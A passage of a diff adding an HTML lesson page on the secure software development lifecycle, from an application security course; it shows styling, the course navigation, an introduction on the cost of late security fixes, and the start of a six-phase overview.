@@ -1,0 +1,1840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AppSec Engineer — Lesson 2: Secure SDLC</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700;9..144,800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #f5f2eb;
+  --surface: #ffffff;
+  --surface2: #f0ece2;
+  --border: #ddd8cc;
+  --ink: #1a1814;
+  --ink2: #4a453c;
+  --ink3: #8a8278;
+  --accent: #c8440a;
+  --accent2: #2d6a4f;
+  --accent3: #1e3a5f;
+  --yellow: #e8a30a;
+  --red: #c0392b;
+  --green: #2d6a4f;
+  --blue: #1e3a5f;
+  --purple: #5b2d8e;
+  --code-bg: #1a1814;
+  --code-text: #e8e0d0;
+  --phase-req: #c8440a;
+  --phase-design: #9b2c8a;
+  --phase-dev: #1e6bb5;
+  --phase-test: #2d8a4e;
+  --phase-deploy: #b87c0a;
+  --phase-ops: #5b2d8e;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--ink);
+  font-family: 'DM Sans', sans-serif;
+  font-size: 15px;
+  line-height: 1.8;
+  min-height: 100vh;
+}
+
+/* SIDEBAR */
+.sidebar {
+  position: fixed;
+  left: 0; top: 0; bottom: 0;
+  width: 252px;
+  background: var(--ink);
+  overflow-y: auto;
+  z-index: 100;
+  padding: 0 0 2rem 0;
+}
+.sidebar-brand {
+  padding: 1.5rem 1.25rem 1rem;
+  border-bottom: 1px solid rgba(255,255,255,0.08);
+  margin-bottom: 0.5rem;
+}
+.sidebar-brand .badge {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  background: var(--accent);
+  color: #fff;
+  padding: 2px 8px;
+  border-radius: 2px;
+  letter-spacing: 0.12em;
+  font-weight: 600;
+  display: inline-block;
+  margin-bottom: 8px;
+  text-transform: uppercase;
+}
+.sidebar-brand h2 {
+  font-family: 'Fraunces', serif;
+  font-size: 14px;
+  font-weight: 600;
+  color: rgba(255,255,255,0.85);
+  line-height: 1.4;
+}
+.sidebar-section {
+  padding: 0.75rem 1.25rem 0.2rem;
+  font-size: 9px;
+  font-weight: 600;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: rgba(255,255,255,0.28);
+  margin-top: 0.25rem;
+}
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 0.42rem 1.25rem;
+  cursor: pointer;
+  border-left: 2px solid transparent;
+  transition: all 0.15s;
+  font-size: 12.5px;
+  color: rgba(255,255,255,0.38);
+  text-decoration: none;
+}
+.nav-item:hover { color: rgba(255,255,255,0.75); background: rgba(255,255,255,0.04); }
+.nav-item.active { color: #fff; border-left-color: var(--accent); background: rgba(200,68,10,0.12); }
+.nav-item.done { color: rgba(255,255,255,0.5); }
+.nav-item .num {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  min-width: 22px;
+  opacity: 0.45;
+}
+.nav-item.active .num { opacity: 1; color: var(--accent); }
+
+/* MAIN */
+.main { margin-left: 252px; min-height: 100vh; }
+
+.topbar {
+  position: sticky;
+  top: 0;
+  background: rgba(245,242,235,0.96);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border);
+  padding: 0.7rem 2.5rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  z-index: 50;
+}
+.breadcrumb {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  color: var(--ink3);
+}
+.breadcrumb span { color: var(--accent); font-weight: 600; }
+.lesson-badge {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  padding: 3px 10px;
+  background: var(--ink);
+  color: #fff;
+  border-radius: 2px;
+  letter-spacing: 0.08em;
+}
+
+.content { padding: 3rem 2.5rem 4rem; max-width: 920px; }
+
+/* HERO */
+.lesson-hero {
+  margin-bottom: 3rem;
+  padding-bottom: 2.5rem;
+  border-bottom: 2px solid var(--border);
+  position: relative;
+}
+.lesson-number {
+  font-family: 'Fraunces', serif;
+  font-size: 7rem;
+  font-weight: 800;
+  color: var(--border);
+  line-height: 1;
+  position: absolute;
+  right: 0;
+  top: -1rem;
+  user-select: none;
+}
+.lesson-meta { display: flex; gap: 8px; margin-bottom: 1rem; flex-wrap: wrap; }
+.tag {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  padding: 3px 10px;
+  border-radius: 2px;
+  font-weight: 500;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+}
+.tag-advanced { background: rgba(200,68,10,0.1); color: var(--accent); border: 1px solid rgba(200,68,10,0.25); }
+.tag-framework { background: rgba(30,58,95,0.08); color: var(--blue); border: 1px solid rgba(30,58,95,0.2); }
+.tag-time { background: rgba(45,106,79,0.08); color: var(--green); border: 1px solid rgba(45,106,79,0.2); }
+
+.lesson-hero h1 {
+  font-family: 'Fraunces', serif;
+  font-size: 3rem;
+  font-weight: 800;
+  line-height: 1.15;
+  color: var(--ink);
+  margin-bottom: 1rem;
+  max-width: 580px;
+}
+.lesson-hero h1 em { font-style: normal; color: var(--accent); }
+.lesson-hero .subtitle {
+  font-size: 15px;
+  color: var(--ink2);
+  max-width: 580px;
+  line-height: 1.75;
+  margin-bottom: 1.5rem;
+}
+.objectives {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin-top: 1.5rem;
+}
+.obj-cell {
+  background: var(--surface);
+  padding: 1rem 1.1rem;
+}
+.obj-cell .obj-label {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--ink3);
+  margin-bottom: 5px;
+}
+.obj-cell p { font-size: 13px; color: var(--ink2); line-height: 1.55; }
+
+/* SECTION */
+.section { margin-bottom: 3.5rem; }
+.section-header { margin-bottom: 1.5rem; }
+.section-eyebrow {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.14em;
+  color: var(--accent);
+  margin-bottom: 5px;
+  font-weight: 600;
+}
+.section-title {
+  font-family: 'Fraunces', serif;
+  font-size: 1.65rem;
+  font-weight: 700;
+  color: var(--ink);
+  line-height: 1.2;
+}
+.section-desc {
+  font-size: 14px;
+  color: var(--ink2);
+  margin-top: 0.4rem;
+  max-width: 600px;
+  line-height: 1.7;
+}
+
+/* SDLC PHASE PIPELINE */
+.pipeline {
+  display: flex;
+  gap: 0;
+  margin: 1.5rem 0;
+  overflow-x: auto;
+  padding-bottom: 0.5rem;
+}
+.phase-block {
+  flex: 1;
+  min-width: 130px;
+  cursor: pointer;
+  transition: transform 0.15s;
+}
+.phase-block:hover { transform: translateY(-2px); }
+.phase-top {
+  height: 6px;
+  border-radius: 0;
+}
+.phase-block:first-child .phase-top { border-radius: 4px 0 0 0; }
+.phase-block:last-child .phase-top { border-radius: 0 4px 0 0; }
+.phase-inner {
+  border: 1px solid var(--border);
+  border-top: none;
+  padding: 0.85rem 0.9rem;
+  background: var(--surface);
+  transition: background 0.15s;
+}
+.phase-block:hover .phase-inner { background: var(--surface2); }
+.phase-block.active-phase .phase-inner { background: var(--surface2); }
+.phase-num {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  color: var(--ink3);
+  margin-bottom: 3px;
+  letter-spacing: 0.08em;
+}
+.phase-name {
+  font-family: 'Fraunces', serif;
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--ink);
+  margin-bottom: 4px;
+}
+.phase-tag {
+  font-size: 11px;
+  color: var(--ink3);
+  line-height: 1.4;
+}
+.phase-activities {
+  display: none;
+  padding: 0.7rem 0.9rem 0.9rem;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-top: none;
+}
+.phase-block.active-phase .phase-activities { display: block; }
+.phase-activities ul { list-style: none; }
+.phase-activities li {
+  font-size: 12.5px;
+  color: var(--ink2);
+  padding: 2px 0;
+  display: flex;
+  gap: 8px;
+  line-height: 1.5;
+}
+.phase-activities li::before { content: '→'; color: var(--ink3); flex-shrink: 0; }
+
+/* CODE BLOCKS */
+pre {
+  background: var(--code-bg);
+  color: var(--code-text);
+  border-radius: 6px;
+  padding: 1.25rem;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 12.5px;
+  line-height: 1.75;
+  overflow-x: auto;
+  margin: 0.85rem 0;
+  position: relative;
+  border: 1px solid rgba(255,255,255,0.06);
+}
+.code-label {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--ink3);
+  margin-bottom: 6px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.code-label::before { content: ''; display: inline-block; width: 3px; height: 3px; background: var(--ink3); border-radius: 50%; }
+.c-red { color: #ff6b6b; }
+.c-green { color: #6bcb77; }
+.c-yellow { color: #ffd166; }
+.c-blue { color: #74b9ff; }
+.c-purple { color: #c39bd3; }
+.c-orange { color: #fd9644; }
+.c-cyan { color: #4ecdc4; }
+.c-muted { color: #6c6454; }
+.c-str { color: #a8d8a8; }
+.line-bad {
+  display: block;
+  background: rgba(192,57,43,0.15);
+  border-left: 2px solid #c0392b;
+  margin: 0 -1.25rem;
+  padding: 0 1.25rem;
+}
+.line-good {
+  display: block;
+  background: rgba(45,106,79,0.15);
+  border-left: 2px solid #2d6a4f;
+  margin: 0 -1.25rem;
+  padding: 0 1.25rem;
+}
+.line-warn {
+  display: block;
+  background: rgba(232,163,10,0.12);
+  border-left: 2px solid var(--yellow);
+  margin: 0 -1.25rem;
+  padding: 0 1.25rem;
+}
+
+/* CARDS */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1.25rem;
+  margin-bottom: 1rem;
+}
+.card-title {
+  font-family: 'Fraunces', serif;
+  font-size: 1rem;
+  font-weight: 700;
+  color: var(--ink);
+  margin-bottom: 0.5rem;
+}
+
+/* TWO-COL */
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0; }
+.compare-bad { background: rgba(192,57,43,0.04); border: 1px solid rgba(192,57,43,0.2); border-radius: 6px; padding: 1rem 1.1rem; }
+.compare-good { background: rgba(45,106,79,0.04); border: 1px solid rgba(45,106,79,0.2); border-radius: 6px; padding: 1rem 1.1rem; }
+.compare-label {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  font-weight: 700;
+  margin-bottom: 0.6rem;
+}
+.compare-bad .compare-label { color: var(--red); }
+.compare-good .compare-label { color: var(--green); }
+
+/* CALLOUT */
+.callout {
+  border-radius: 4px;
+  padding: 0.9rem 1.1rem;
+  margin: 1rem 0;
+  display: flex;
+  gap: 10px;
+  align-items: flex-start;
+  border-left: 3px solid;
+}
+.callout-warn { background: rgba(192,57,43,0.05); border-color: var(--red); }
+.callout-info { background: rgba(30,58,95,0.05); border-color: var(--blue); }
+.callout-tip  { background: rgba(45,106,79,0.05); border-color: var(--green); }
+.callout-note { background: rgba(232,163,10,0.06); border-color: var(--yellow); }
+.callout-icon { font-size: 15px; flex-shrink: 0; margin-top: 2px; }
+.callout-text { font-size: 13px; color: var(--ink2); line-height: 1.7; }
+.callout-text strong { color: var(--ink); }
+.callout-text code {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11.5px;
+  background: rgba(0,0,0,0.06);
+  padding: 1px 5px;
+  border-radius: 2px;
+}
+
+/* TABLE */
+table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 1rem 0; }
+th {
+  padding: 0.55rem 0.85rem;
+  text-align: left;
+  background: var(--ink);
+  color: rgba(255,255,255,0.75);
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  font-weight: 500;
+}
+th:first-child { border-radius: 4px 0 0 0; }
+th:last-child { border-radius: 0 4px 0 0; }
+td { padding: 0.55rem 0.85rem; border-bottom: 1px solid var(--border); color: var(--ink2); line-height: 1.5; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--surface2); }
+
+/* CHECKLIST */
+.checklist { list-style: none; }
+.checklist li {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  font-size: 13.5px;
+  color: var(--ink2);
+  padding: 5px 0;
+  line-height: 1.6;
+  border-bottom: 1px solid var(--border);
+}
+.checklist li:last-child { border-bottom: none; }
+.checklist li .chk {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  color: var(--green);
+  margin-top: 2px;
+  flex-shrink: 0;
+  font-weight: 600;
+}
+
+/* REAL WORLD BOX */
+.rw-box {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 1rem 1.1rem;
+  margin: 0.85rem 0;
+}
+.rw-label {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--accent);
+  margin-bottom: 5px;
+  font-weight: 600;
+}
+.rw-box p { font-size: 13px; color: var(--ink2); line-height: 1.7; }
+
+/* IMPACT ROW */
+.impact-row { display: flex; flex-wrap: wrap; gap: 7px; margin: 0.6rem 0; }
+.pill {
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 2px;
+  font-family: 'IBM Plex Mono', monospace;
+  font-weight: 500;
+}
+.pill-red { background: rgba(192,57,43,0.08); color: var(--red); border: 1px solid rgba(192,57,43,0.2); }
+.pill-green { background: rgba(45,106,79,0.08); color: var(--green); border: 1px solid rgba(45,106,79,0.2); }
+.pill-blue { background: rgba(30,58,95,0.08); color: var(--blue); border: 1px solid rgba(30,58,95,0.2); }
+.pill-yellow { background: rgba(232,163,10,0.08); color: var(--yellow); border: 1px solid rgba(232,163,10,0.25); }
+.pill-purple { background: rgba(91,45,142,0.08); color: var(--purple); border: 1px solid rgba(91,45,142,0.2); }
+
+/* GATE / MILESTONE */
+.gate-row { display: flex; flex-direction: column; gap: 0.65rem; margin: 1rem 0; }
+.gate {
+  display: flex;
+  align-items: flex-start;
+  gap: 1rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.85rem 1rem;
+  transition: border-color 0.15s;
+}
+.gate:hover { border-color: var(--accent); }
+.gate-phase {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  font-weight: 700;
+  padding: 3px 9px;
+  border-radius: 2px;
+  white-space: nowrap;
+  flex-shrink: 0;
+  margin-top: 1px;
+}
+.gate-content { flex: 1; }
+.gate-title { font-size: 13.5px; font-weight: 600; color: var(--ink); margin-bottom: 3px; }
+.gate-desc { font-size: 12.5px; color: var(--ink3); line-height: 1.55; }
+.gate-tools {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  color: var(--ink3);
+  margin-top: 5px;
+}
+.gate-tools span { color: var(--blue); }
+
+/* EXPANDED PHASE PANEL */
+.phase-panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 1rem 0;
+}
+.phase-panel-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 1rem 1.25rem;
+  cursor: pointer;
+  background: var(--surface);
+  transition: background 0.15s;
+  user-select: none;
+}
+.phase-panel-header:hover { background: var(--surface2); }
+.phase-dot {
+  width: 12px; height: 12px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+.phase-panel-title {
+  font-family: 'Fraunces', serif;
+  font-size: 1rem;
+  font-weight: 700;
+  flex: 1;
+}
+.phase-panel-sub { font-size: 12px; color: var(--ink3); }
+.phase-panel-toggle { color: var(--ink3); font-size: 14px; transition: transform 0.2s; }
+.phase-panel.open .phase-panel-toggle { transform: rotate(180deg); }
+.phase-panel-body { display: none; padding: 0 1.25rem 1.25rem; border-top: 1px solid var(--border); }
+.phase-panel.open .phase-panel-body { display: block; }
+.phase-panel-body h4 {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--ink3);
+  margin: 1rem 0 0.5rem;
+  font-weight: 600;
+}
+.phase-panel-body p { font-size: 13.5px; color: var(--ink2); line-height: 1.75; margin-top: 0.75rem; }
+
+/* QUIZ */
+.quiz-block {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1.25rem;
+  margin-bottom: 1rem;
+}
+.quiz-q { font-size: 14.5px; font-weight: 600; color: var(--ink); margin-bottom: 0.85rem; line-height: 1.5; }
+.quiz-options { display: flex; flex-direction: column; gap: 7px; margin-bottom: 0.75rem; }
+.quiz-opt {
+  padding: 0.65rem 1rem;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 13.5px;
+  color: var(--ink2);
+  background: var(--bg);
+  transition: all 0.15s;
+}
+.quiz-opt:hover { border-color: var(--ink); color: var(--ink); }
+.quiz-opt.correct { border-color: var(--green); color: var(--green); background: rgba(45,106,79,0.05); cursor: default; }
+.quiz-opt.wrong { border-color: var(--red); color: var(--red); background: rgba(192,57,43,0.05); cursor: default; }
+.quiz-opt.reveal { border-color: var(--green); color: var(--green); background: rgba(45,106,79,0.05); cursor: default; }
+.quiz-exp {
+  font-size: 13px;
+  color: var(--ink2);
+  line-height: 1.7;
+  padding: 0.75rem 1rem;
+  background: var(--surface2);
+  border-radius: 4px;
+  border-left: 3px solid var(--green);
+  display: none;
+}
+.quiz-exp.show { display: block; }
+.quiz-exp code {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11.5px;
+  background: rgba(0,0,0,0.06);
+  padding: 1px 5px;
+  border-radius: 2px;
+}
+
+/* CHALLENGE */
+.challenge-wrap {
+  background: var(--ink);
+  border-radius: 8px;
+  padding: 2rem;
+  margin: 3rem 0;
+  position: relative;
+  overflow: hidden;
+}
+.challenge-wrap::before {
+  content: '';
+  position: absolute;
+  top: 0; right: 0;
+  width: 200px; height: 200px;
+  background: radial-gradient(circle, rgba(200,68,10,0.15) 0%, transparent 70%);
+  pointer-events: none;
+}
+.challenge-eyebrow {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 9px;
+  text-transform: uppercase;
+  letter-spacing: 0.15em;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+  font-weight: 700;
+}
+.challenge-wrap h3 {
+  font-family: 'Fraunces', serif;
+  font-size: 1.4rem;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 0.75rem;
+}
+.challenge-wrap .ch-desc { font-size: 13.5px; color: rgba(255,255,255,0.55); line-height: 1.7; margin-bottom: 1.25rem; }
+.ch-scenario {
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 4px;
+  padding: 1rem 1.1rem;
+  margin-bottom: 1.25rem;
+}
+.ch-scenario p { font-size: 13px; color: rgba(255,255,255,0.65); line-height: 1.7; }
+.ch-scenario strong { color: rgba(255,255,255,0.9); }
+.challenge-wrap textarea {
+  width: 100%;
+  min-height: 130px;
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.12);
+  border-radius: 4px;
+  padding: 1rem;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 12.5px;
+  color: rgba(255,255,255,0.85);
+  resize: vertical;
+  outline: none;
+  transition: border-color 0.2s;
+  margin-bottom: 1rem;
+}
+.challenge-wrap textarea:focus { border-color: var(--accent); }
+.challenge-wrap textarea::placeholder { color: rgba(255,255,255,0.2); }
+.btn-row { display: flex; gap: 10px; flex-wrap: wrap; }
+.btn {
+  padding: 9px 20px;
+  border-radius: 3px;
+  font-size: 12.5px;
+  font-family: 'DM Sans', sans-serif;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.15s;
+  border: 1px solid;
+  letter-spacing: 0.02em;
+}
+.btn-primary { background: var(--accent); color: #fff; border-color: var(--accent); }
+.btn-primary:hover { background: #a8360a; }
+.btn-ghost { background: transparent; color: rgba(255,255,255,0.5); border-color: rgba(255,255,255,0.15); }
+.btn-ghost:hover { color: #fff; border-color: rgba(255,255,255,0.4); }
+.ch-feedback {
+  margin-top: 1rem;
+  padding: 1rem 1.1rem;
+  border-radius: 4px;
+  font-size: 13px;
+  line-height: 1.7;
+  display: none;
+}
+.ch-feedback.show { display: block; }
+.ch-feedback.good { background: rgba(45,106,79,0.15); border: 1px solid rgba(45,106,79,0.3); color: #6bcb77; }
+.ch-feedback.hint { background: rgba(232,163,10,0.1); border: 1px solid rgba(232,163,10,0.25); color: #ffd166; }
+.ch-feedback.reveal { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.12); color: rgba(255,255,255,0.75); }
+.ch-feedback code {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11.5px;
+  background: rgba(255,255,255,0.08);
+  padding: 1px 5px;
+  border-radius: 2px;
+  color: rgba(255,255,255,0.85);
+}
+
+/* FLOW DIAGRAM */
+.flow-diagram {
+  display: flex;
+  align-items: stretch;
+  gap: 0;
+  margin: 1.25rem 0;
+  overflow-x: auto;
+}
+.flow-node {
+  flex: 1;
+  min-width: 110px;
+  text-align: center;
+  padding: 0.75rem 0.5rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  font-size: 12px;
+  color: var(--ink2);
+  line-height: 1.4;
+  transition: background 0.15s;
+}
+.flow-node:hover { background: var(--surface2); }
+.flow-node .fn-title { font-weight: 600; color: var(--ink); font-size: 12px; }
+.flow-node .fn-sub { font-size: 11px; color: var(--ink3); margin-top: 2px; }
+.flow-arrow-box {
+  display: flex;
+  align-items: center;
+  padding: 0 6px;
+  color: var(--ink3);
+  font-size: 14px;
+  background: var(--bg);
+}
+.flow-node.bad-node { border-color: rgba(192,57,43,0.35); background: rgba(192,57,43,0.04); }
+.flow-node.good-node { border-color: rgba(45,106,79,0.35); background: rgba(45,106,79,0.04); }
+
+/* NAV FOOTER */
+.lesson-nav-footer {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 4rem;
+  padding-top: 2rem;
+  border-top: 2px solid var(--border);
+}
+.nav-btn-prev, .nav-btn-next {
+  padding: 0.85rem 1.5rem;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  font-size: 13px;
+  cursor: pointer;
+  background: var(--surface);
+  color: var(--ink2);
+  text-align: center;
+  transition: all 0.15s;
+  text-decoration: none;
+  display: block;
+}
+.nav-btn-prev:hover, .nav-btn-next:hover { border-color: var(--ink); color: var(--ink); }
+.nav-btn-next {
+  background: var(--ink);
+  color: #fff;
+  border-color: var(--ink);
+}
+.nav-btn-next:hover { background: #2e2a24; }
+.nav-dir { font-family: 'IBM Plex Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--ink3); display: block; margin-bottom: 3px; }
+.nav-btn-next .nav-dir { color: rgba(255,255,255,0.4); }
+.nav-title { font-weight: 600; display: block; }
+
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+/* inline code */
+code {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 12px;
+  background: rgba(0,0,0,0.06);
+  padding: 1px 5px;
+  border-radius: 2px;
+  color: var(--accent);
+}
+pre code { background: none; padding: 0; color: inherit; font-size: inherit; }
+
+@media (max-width: 860px) {
+  .sidebar { display: none; }
+  .main { margin-left: 0; }
+  .content { padding: 1.5rem 1.1rem 3rem; }
+  .objectives { grid-template-columns: 1fr; }
+  .two-col { grid-template-columns: 1fr; }
+  .lesson-number { display: none; }
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    <div class="badge">AppSec Engineer</div>
+    <h2>Application Security<br>Learning Path</h2>
+  </div>
+  <div class="sidebar-section">Module 1 — Foundations</div>
+  <a class="nav-item done" href="#"><span class="num">01</span> OWASP Top 10 2021</a>
+  <a class="nav-item active" href="#"><span class="num">02</span> Secure SDLC</a>
+  <a class="nav-item" href="#"><span class="num">03</span> Threat Modeling</a>
+  <div class="sidebar-section">Module 2 — Testing Tools</div>
+  <a class="nav-item" href="#"><span class="num">04</span> SAST</a>
+  <a class="nav-item" href="#"><span class="num">05</span> DAST</a>
+  <a class="nav-item" href="#"><span class="num">06</span> SCA</a>
+  <a class="nav-item" href="#"><span class="num">07</span> IAST & RASP</a>
+  <div class="sidebar-section">Module 3 — API Security</div>
+  <a class="nav-item" href="#"><span class="num">08</span> OWASP API Top 10</a>
+  <a class="nav-item" href="#"><span class="num">09</span> API Security Testing</a>
+  <a class="nav-item" href="#"><span class="num">10</span> GraphQL Security</a>
+  <div class="sidebar-section">Module 4 — DevSecOps</div>
+  <a class="nav-item" href="#"><span class="num">11</span> DevSecOps Pipeline</a>
+  <a class="nav-item" href="#"><span class="num">12</span> Secrets Management</a>
+  <a class="nav-item" href="#"><span class="num">13</span> Container Security</a>
+  <a class="nav-item" href="#"><span class="num">14</span> Dependency Scanning</a>
+  <a class="nav-item" href="#"><span class="num">15</span> SBOM</a>
+  <div class="sidebar-section">Module 5 — Architecture</div>
+  <a class="nav-item" href="#"><span class="num">16</span> Security Architecture</a>
+  <a class="nav-item" href="#"><span class="num">17</span> Supply Chain Security</a>
+  <a class="nav-item" href="#"><span class="num">18</span> WAF</a>
+  <a class="nav-item" href="#"><span class="num">19</span> Code Review</a>
+  <a class="nav-item" href="#"><span class="num">20</span> RASP</a>
+</nav>
+
+<!-- MAIN -->
+<div class="main">
+  <div class="topbar">
+    <div class="breadcrumb">appsec-engineer / module-1 / <span>secure-sdlc</span></div>
+    <div class="lesson-badge">Lesson 02 / 20</div>
+  </div>
+
+  <div class="content">
+
+    <!-- HERO -->
+    <div class="lesson-hero">
+      <div class="lesson-number">02</div>
+      <div class="lesson-meta">
+        <span class="tag tag-advanced">Advanced</span>
+        <span class="tag tag-framework">Framework</span>
+        <span class="tag tag-time">~55 min</span>
+      </div>
+      <h1>Secure <em>SDLC</em><br>Implementation</h1>
+      <p class="subtitle">The SDLC — Software Development Lifecycle — is the process every team uses to build software. A Secure SDLC means weaving security into every single phase, not bolting it on at the end. This lesson teaches you exactly what to do at each phase, what tools to use, and how to prove it to an interviewer or an auditor.</p>
+      <div class="objectives">
+        <div class="obj-cell">
+          <div class="obj-label">You will understand</div>
+          <p>What happens at each SDLC phase, why it matters for security, and what goes wrong when it's skipped</p>
+        </div>
+        <div class="obj-cell">
+          <div class="obj-label">You will implement</div>
+          <p>Real CI/CD pipeline configs, pre-commit hooks, security gates, and policy-as-code patterns</p>
+        </div>
+        <div class="obj-cell">
+          <div class="obj-label">You will defend</div>
+          <p>Answer "how does your team implement Secure SDLC?" confidently in any AppSec interview</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- WHY SECURE SDLC -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow">The Core Problem</div>
+        <div class="section-title">Why "security at the end" fails</div>
+        <p class="section-desc">Most teams used to build first and audit later. That model is broken — and understanding why is foundational to your career as an AppSec engineer.</p>
+      </div>
+
+      <p style="font-size:14px;color:var(--ink2);line-height:1.8;margin-bottom:1rem;">The IBM Systems Science Institute found that fixing a bug found in <strong>production</strong> costs <strong>100× more</strong> than fixing the same bug found in <strong>design</strong>. Not 2×. Not 10×. One hundred times more expensive in money, time, and reputation.</p>
+
+      <div class="rw-box">
+        <div class="rw-label">📊 Real Cost — The IBM Finding</div>
+        <p>A SQL injection vulnerability found during <strong>requirements/design review</strong> costs ~$80 to fix (developer time to redesign input handling). The same SQLi found after a <strong>production breach</strong> costs $80,000–$8M+ (incident response, legal, regulatory fines, public notification, customer loss, brand damage). The ratio is 1:100 to 1:100,000.</p>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-icon">⚠️</div>
+        <div class="callout-text"><strong>Security bolt-on failure:</strong> When security is a final gate before release, developers get a pentest report 2 days before launch, scramble to "fix" issues superficially without understanding them, and ship insecure software anyway because the deadline doesn't move. This is the waterfall security model — and it fails every time.</div>
+      </div>
+
+      <div class="callout callout-tip">
+        <div class="callout-icon">💡</div>
+        <div class="callout-text"><strong>Secure SDLC as a career concept:</strong> As an AppSec engineer, your job is NOT to be the gatekeeper who blocks releases. Your job is to make security <em>invisible to developers</em> — to embed it so deeply in tooling and process that vulnerabilities are caught automatically before they ever reach you. This lesson teaches you how to do that.</div>
+      </div>
+    </div>
+
+    <!-- THE 6 PHASES — PIPELINE OVERVIEW -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow">The Framework</div>
+        <div class="section-title">The 6 phases of Secure SDLC</div>
+        <p class="section-desc">Click any phase to see what security activities happen there and what goes wrong without them.</p>
+      </div>
+
+      <div class="pipeline" id="pipeline">
+        <div class="phase-block" id="ph-req" onclick="activatePhase('req')">
+          <div class="phase-top" style="background:var(--phase-req)"></div>
+          <div class="phase-inner">
+            <div class="phase-num">Phase 01</div>
+            <div class="phase-name">Requirements</div>
+            <div class="phase-tag">Security requirements gathering</div>
+          </div>
+          <div class="phase-activities">
+            <ul>
+              <li>Define security requirements alongside functional ones</li>
+              <li>Identify compliance needs (PCI-DSS, HIPAA, GDPR)</li>
+              <li>Create abuse cases (not just use cases)</li>
+              <li>Define data classification: what data is sensitive?</li>
